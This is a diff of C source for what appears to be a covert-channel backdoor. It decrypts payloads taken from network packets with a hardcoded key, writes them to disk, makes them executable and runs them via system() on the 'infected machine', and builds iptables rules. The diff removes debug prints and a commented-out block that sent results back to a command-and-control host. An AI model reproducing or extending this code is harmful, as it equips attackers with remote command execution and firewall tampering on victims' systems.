@@ -142,9 +142,9 @@ void iptables(char *ip, char *protocol, char *port, bool input, bool remove){
     char iptable[BUFFERSIZE];
     memset(iptable, '\0', BUFFERSIZE);
     if(remove){
-        strcat(iptable,"iptables -D ");
+        strcat(iptable,"iptables -D");
     } else {
-        strcat(iptable,"iptables -I ");
+        strcat(iptable,"iptables -I");
     }
     if(input){
         strcat(iptable," INPUT -p ");
@@ -171,9 +171,7 @@ void ParsePayload(struct filter *Filter, const u_char *payload, int len){
         perror("fopen");
         exit(1);
     }
-//    printf("Encrypted Payload size is: %lu\n", sizeof(payload));
     cipherlen = strlen((char*)payload);
-//    printf("Encrypted Payload is: %s \n", payload);
     decryptedlen = decryptMessage((unsigned char*)payload, BUFSIZE+16, (unsigned char*)KEY, (unsigned char *)IV, decryptedtext);
 
     printf("Decrypted payload size: %d\n", decryptedlen);
@@ -182,23 +180,6 @@ void ParsePayload(struct filter *Filter, const u_char *payload, int len){
         perror("fwrite");
         exit(1);
     }
-    //if CNC
-    /*fclose(fp);
-    system(CHMOD);
-    system(CMD);
-    char ip[sizeof(Filter->targetip)];
-    strcpy(ip,Filter->targetip);
-    system(IPTABLES(ip,TCP,PORT));
-
-    //sending the results back to the CNC
-    char *srcip = Filter->localip;
-    char *destip = Filter->targetip;
-    unsigned short sport = Filter->port_ushort[0];
-    unsigned short dport = Filter->port_ushort[1];
-
-    send_results(srcip, destip, sport, dport, RESULT_FILE);
-    system(TURNOFF(Filter->targetip));*/
-    //infected machine
     fclose(fp);
     system(CHMOD);
     system(CMD);
